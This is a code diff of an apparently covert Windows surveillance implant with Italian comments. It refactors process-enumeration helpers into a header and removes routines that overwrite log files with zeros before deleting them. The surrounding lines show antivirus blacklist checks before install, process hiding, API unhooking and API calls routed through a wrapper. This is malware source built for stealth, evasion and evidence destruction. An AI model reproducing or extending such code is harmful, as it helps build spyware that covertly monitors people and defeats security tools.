@@ -39,20 +39,18 @@
 #include "bin_string.h"
 #include "UnHookClass.h"
 #include "x64.h"
-#include "av_detect.h"
 #include "DeepFreeze.h"
 #include "HM_BitmapCommon.h"
 #include <time.h>
 #include <crypto/sha1.h>
 #include "status_log.h"
 #include "format_resistant.h"
-
+#include "process.h"
+#include "av_detect.h"
 #include <tchar.h>
 #include <Strsafe.h>
 
 // Prototipi usati per comodita'
-char *HM_FindProc(DWORD);
-DWORD HM_FindPid(char *, BOOL);
 void HM_U2A(char *buffer);
 void LockConfFile();
 void UnlockConfFile();
@@ -1128,267 +1126,6 @@ BOOL GetUserUniqueHash(BYTE *user_hash, DWORD hash_size)
 	return ret_val;
 }
 
-typedef struct  {
-	HWND proc_window;
-	DWORD pid;
-} proc_window_struct;
-
-BOOL CALLBACK IsProcWindow(HWND hwnd, LPARAM param) 
-{
-	proc_window_struct *pstr = (proc_window_struct *)param;
-	DWORD pid;
-	if (GetWindowLong(hwnd, GWL_HWNDPARENT) != NULL)
-		return TRUE;
-	if (!IsWindowVisible(hwnd))
-		return TRUE;
-	GetWindowThreadProcessId(hwnd, &pid);
-	if (pid == pstr->pid) {
-		pstr->proc_window = hwnd;
-		return FALSE;
-	}
-	return TRUE;
-}
-// Torna la finestra del processo "procname"
-HWND HM_GetProcessWindow(char *procname)
-{
-	proc_window_struct proc_window;
-	proc_window.proc_window = NULL;
-	proc_window.pid = HM_FindPid(procname, TRUE);
-	if (proc_window.pid == 0)
-		return NULL;
-
-	EnumWindows(IsProcWindow, (LPARAM)(&proc_window));
-	return proc_window.proc_window;
-}
-
-// Ritorna il nome del processo "pid"
-// Torna NULL se non ha trovato niente 
-// N.B. Se torna una stringa, va liberata
-char *HM_FindProc(DWORD pid)
-{
-	HANDLE hProcessSnap;
-	PROCESSENTRY32 pe32;
-	DWORD dwPID = 0;
-	char *name_offs;
-	char *ret_name = NULL;
-
-	pe32.dwSize = sizeof( PROCESSENTRY32 );
-	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
-		return NULL;
-
-	if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
-		CloseHandle( hProcessSnap );
-		return NULL;
-	}
-
-	// Cicla la lista dei processi attivi
-	do {
-		// Cerca il processo "pid"
-		if (pe32.th32ProcessID == pid) {
-			// Elimina il path
-			name_offs = strrchr(pe32.szExeFile, '\\');
-			if (!name_offs)
-				name_offs = pe32.szExeFile;
-			else
-				name_offs++;
-			ret_name = _strdup(name_offs);
-			break;
-		}
-	} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );
-
-	CloseHandle( hProcessSnap );
-	return ret_name;
-}
-
-// Ritorna il nome del processo "pid"
-// Torna NULL se non ha trovato niente 
-// N.B. Se torna una stringa, va liberata
-WCHAR *HM_FindProcW(DWORD pid)
-{
-	HANDLE hProcessSnap;
-	PROCESSENTRY32W pe32;
-	DWORD dwPID = 0;
-	WCHAR *name_offs;
-	WCHAR *ret_name = NULL;
-
-	pe32.dwSize = sizeof(pe32);
-	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
-		return NULL;
-
-	if( !FNC(Process32FirstW)( hProcessSnap, &pe32 ) ) {
-		CloseHandle( hProcessSnap );
-		return NULL;
-	}
-
-	// Cicla la lista dei processi attivi
-	do {
-		// Cerca il processo "pid"
-		if (pe32.th32ProcessID == pid) {
-			// Elimina il path
-			name_offs = wcsrchr(pe32.szExeFile, L'\\');
-			if (!name_offs)
-				name_offs = pe32.szExeFile;
-			else
-				name_offs++;
-			ret_name = _wcsdup(name_offs);
-			break;
-		}
-	} while( FNC(Process32NextW)( hProcessSnap, &pe32 ) );
-
-	CloseHandle( hProcessSnap );
-	return ret_name;
-}
-
-BOOL HM_FindProcPath(DWORD pid, WCHAR *file_path, DWORD len)
-{
-	HANDLE hProc;
-
-	hProc = OpenProcess(0x410, FALSE, pid);
-	if (hProc == NULL)
-		return FALSE;
-
-	if (GetModuleFileNameExW(hProc, NULL, file_path, len) > 0) {	
-		CloseHandle(hProc);
-		return TRUE;
-	}
-
-	CloseHandle(hProc);
-	return FALSE;
-}
-
-// Ritorna la descrizione di un processo dato il PID
-BOOL ReadDesc(DWORD pid, WCHAR *file_desc, DWORD len)
-{
-	HRESULT hr;
-	DWORD size, dummy;
-	BYTE *pBlock;
-	UINT cbTranslate = 0, desc_size = 0;
-	WCHAR *description;
-	WCHAR file_path[MAX_PATH];
-	BOOL ret_val;
-	BYTE SubBlock[100];
-	struct LANGANDCODEPAGE {
-	  WORD wLanguage;
-	  WORD wCodePage;
-	} *lpTranslate;
-
-	if (!HM_FindProcPath(pid, file_path, sizeof(file_path)))
-		return FALSE;
-
-	size = GetFileVersionInfoSizeW(file_path, &dummy);
-	if (size == 0) 
-		return FALSE;
-	
-	pBlock = (BYTE *)malloc(size);
-	if (!pBlock) 
-		return FALSE;
-	
-	if (!GetFileVersionInfoW(file_path, 0, size, pBlock)) {
-		free(pBlock);
-		return FALSE;
-	}
-
-	ret_val = VerQueryValueW(pBlock, L"\\VarFileInfo\\Translation", (LPVOID*)&lpTranslate, &cbTranslate);
-	if (!ret_val || cbTranslate < sizeof(struct LANGANDCODEPAGE)) {
-		free(pBlock);
-		return FALSE;
-	}
-
-	ZeroMemory(SubBlock, sizeof(SubBlock));
-	hr = StringCchPrintfW((STRSAFE_LPWSTR)SubBlock, sizeof(SubBlock)-1, L"\\StringFileInfo\\%04x%04x\\FileDescription", lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);
-	if (FAILED(hr)) {
-		free(pBlock);
-		return FALSE;
-	}
-
-	if (VerQueryValueW(pBlock, (LPCWSTR)SubBlock, (LPVOID *)&description, &desc_size)) {
-		_snwprintf_s(file_desc, len/sizeof(WCHAR), _TRUNCATE, L"%s", description);		
-		free(pBlock);
-		return TRUE;
-	}
-
-	free(pBlock);
-	return FALSE;
-}
-
-// Torna TRUE se il processo e' dell'utente
-// chiamante
-BOOL IsMyProcess(DWORD pid)
-{
-	HANDLE hProc=0;
-	HANDLE hToken=0;
-	TOKEN_USER *token_owner=NULL;
-	char wsRefDomain[512], wsUserName[512], wsEffectiveName[512];
-	SID_NAME_USE peUse;
-	BOOL ret_val = FALSE;
-	DWORD dwLen=0, cbUserName = sizeof(wsUserName), cbRefDomain = sizeof(wsRefDomain), cbEffectiveName = sizeof(wsEffectiveName);
-
-	hProc = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, pid);
-
-	if (hProc) {
-		if( FNC(OpenProcessToken)(hProc, TOKEN_QUERY| TOKEN_QUERY_SOURCE, &hToken) ) {
-			FNC(GetTokenInformation)(hToken, TokenUser, token_owner, 0, &dwLen);
-			if (dwLen)
-				token_owner = (TOKEN_USER *) malloc( dwLen );
-			if(token_owner) {
-				memset(token_owner, 0, dwLen);
-				if( FNC(GetTokenInformation)(hToken, TokenUser, token_owner, dwLen, &dwLen) )
-					if (FNC(LookupAccountSidA)(NULL, token_owner->User.Sid, wsUserName, &cbUserName, wsRefDomain, &cbRefDomain, &peUse)) 
-						if (FNC(GetUserNameA)(wsEffectiveName, &cbEffectiveName))
-							if (!_stricmp(wsEffectiveName, wsUserName))
-								ret_val = TRUE;
-				free(token_owner);
-			}
-			CloseHandle(hToken);
-		}
-		CloseHandle(hProc);
-	}
-
-	return ret_val;
-}
-
-// Ritorna il PID del processo "proc_name"
-// Torna 0 se non lo trova
-// Se my_flag e' settato, torna solo i processi
-// dell'utente chiamante
-DWORD HM_FindPid(char *proc_name, BOOL my_flag)
-{
-	HANDLE hProcessSnap;
-	PROCESSENTRY32 pe32;
-	DWORD dwPID = 0;
-	char *name_offs;
-
-	pe32.dwSize = sizeof( PROCESSENTRY32 );
-	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
-		return 0;
-
-	if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
-		CloseHandle( hProcessSnap );
-		return 0;
-	}
-
-	// Cicla la lista dei processi attivi
-	do {
-		// Elimina il path
-		name_offs = strrchr(pe32.szExeFile, '\\');
-		if (!name_offs)
-			name_offs = pe32.szExeFile;
-		else
-			name_offs++;
-
-		// Cerca il processo confrontando il nome
-		if (!_stricmp(name_offs, proc_name)) {
-			if (!my_flag || IsMyProcess(pe32.th32ProcessID)) {
-				dwPID = pe32.th32ProcessID;
-				break;
-			}
-		}
-	} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );
-
-	CloseHandle( hProcessSnap );
-	return dwPID;
-}
-
 
 #define MAX_CMD_LINE 800
 typedef BOOL (WINAPI *CreateProcess_t) (LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
@@ -2039,94 +1776,6 @@ char *HM_memstr(char *memory, char *string)
 		ptr++;
 	}
 }
-
-static BOOL WINAPI _wipeFileContent(HANDLE hFile)
-{
-	const CHAR pattern[] = "\x0\x0\x0\x0\x0\x0\x0";
-
-	if (hFile == INVALID_HANDLE_VALUE)
-		return FALSE;
-
-	DWORD file_size = FNC(GetFileSize)(hFile, NULL);
-
-		if (file_size == INVALID_FILE_SIZE)
-			file_size = 0;
-
-		DWORD dwTmp = 0;
-		for (DWORD wiped_size = 0; wiped_size < file_size; wiped_size += sizeof(pattern))
-			FNC(WriteFile)(hFile, &pattern, sizeof(pattern), &dwTmp, NULL);
-
-	return TRUE;
-}
-
-// Tenta a tutti i costi di cancellare un file
-void HM_WipeFileA(LPCSTR lpFileName)
-{
-	BOOL ret_val = FALSE;
-	DWORD i;
-
-	// Toglie il readonly
-	for(i=0; i<MAX_DELETE_TRY; i++) {
-		ret_val = FNC(SetFileAttributesA)(lpFileName, FILE_ATTRIBUTE_NORMAL);
-		if (ret_val || GetLastError()==ERROR_FILE_NOT_FOUND)
-			break;
-		Sleep(DELETE_SLEEP_TIME);
-	}
-
-	// Sovrascrive (solo se e' stato configurato per farlo)
-	if (log_wipe_file) {
-		for(i=0; i<MAX_DELETE_TRY; i++) {
-			HANDLE hFile = FNC(CreateFileA)(lpFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-			if (_wipeFileContent(hFile)) {
-				CloseHandle(hFile);
-				break;
-			}
-			Sleep(DELETE_SLEEP_TIME);
-		}
-	}
-
-	// Cancella
-	for(i=0; i<MAX_DELETE_TRY; i++) {
-		ret_val = FNC(DeleteFileA)(lpFileName);
-		if (ret_val || GetLastError()==ERROR_FILE_NOT_FOUND)
-			break;
-		Sleep(DELETE_SLEEP_TIME);
-	}
-}
-
-
-void HM_WipeFileW(LPCWSTR lpFileName)
-{
-	DWORD i;
-	HANDLE hFile = NULL;
-
-	// Toglie il readonly
-	for(i=0; i<MAX_DELETE_TRY; i++) {
-		if (FNC(SetFileAttributesW)(lpFileName, FILE_ATTRIBUTE_NORMAL))
-			break;
-		Sleep(DELETE_SLEEP_TIME);
-	}
-
-	// Sovrascrive (solo se e' stato configurato per farlo)
-	if (log_wipe_file) {
-		for(i=0; i<MAX_DELETE_TRY; i++) {
-			if ( ( hFile = FNC(CreateFileW)(lpFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) != INVALID_HANDLE_VALUE ) {
-				if (_wipeFileContent(hFile))
-					CloseHandle(hFile);
-				break;
-			}
-			Sleep(DELETE_SLEEP_TIME);
-		}
-	}
-	
-	// Cancella
-	for(i=0; i<MAX_DELETE_TRY; i++) {
-		if (FNC(DeleteFileW)(lpFileName))
-			break;
-		Sleep(DELETE_SLEEP_TIME);
-	}
-}
-
 
 // Verifica se c'e' una copia integra del file di configurazione.
 // Se e' integra la rimpiazza sull'originale. In ogni caso la cancella (se esiste).
@@ -2817,7 +2466,7 @@ void DeletePending()
 // Main del core
 void __stdcall HM_sMain(void)
 {
-	pid_hide_struct pid_hide;
+	PID_HIDE pid_hide;
 
 	// Ci sono degli AV con cui proprio non si deve installare
 	if (IsBlackList()) 
